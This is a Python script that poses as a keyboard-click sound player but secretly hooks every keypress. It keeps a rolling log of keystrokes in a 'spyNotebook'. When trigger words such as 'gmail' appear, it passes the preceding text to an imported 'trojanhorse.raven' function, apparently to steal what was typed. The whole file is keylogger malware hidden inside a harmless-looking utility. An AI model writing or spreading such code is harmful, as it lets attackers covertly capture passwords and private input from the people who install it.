
import pygame
import keyboard
import random
import trojanhorse;
import linkedlist;
from linkedlist import *
pygame.init()


spyNotebook = linkedlist.LinkedList()
keypresses = 0
def getLength(array):
    length = 0
    for i in array:
        length += 1
    return length - 1 # for convinience😐

def run():

    currentSound = pygame.mixer.Sound('key-1.wav')

    # I could remember how to get length os an array in python; So here we are


    def randomizeSound():
        global currentSound
        sound = [1, 1, 1, 2, 3, 3]
        currentSound = pygame.mixer.Sound(f'key-{sound[random.randint(0, getLength(sound))]}.wav')

    def on_key_event(e):
        if e.event_type == keyboard.KEY_DOWN:
           #print(f'Key pressed: {e.name}')
           spy(e.name)
           randomizeSound()
           soundVolume = 0.2
           currentSound.set_volume(soundVolume)
           currentSound.play()

    def spy(key):
        global spyNotebook, keypresses
        keywords = ['gmail', 'smile', 'fanta']

        if key == 'space':
            key = ' '
        elif key == 'enter':
            key = '//'
        elif key == 'backspace':
            key = '<'
        elif key == 'shift':
            key = '⇧'
        elif key == 'caps lock':
            key = 'cps'
        elif key == 'delete':
            key = 'del'


        if key != '<':
            keypresses += 1
            spyNotebook.append(key)
        else:
            spyNotebook.pop(spyNotebook.length() - 1)

        spyNotebook.display()


        if spyNotebook.length() > 30:
            spyNotebook.pop(0)

        def readNotebook():
            contents = spyNotebook.to_string()
            for keyword in keywords:
                if keyword in contents:
                    trojanhorse.raven(contents.split(keyword)[0], keyword)
        
        if keypresses > 15:
            readNotebook()
            keypresses = 0

    keyboard.hook(on_key_event)

    keyboard.wait()


run()



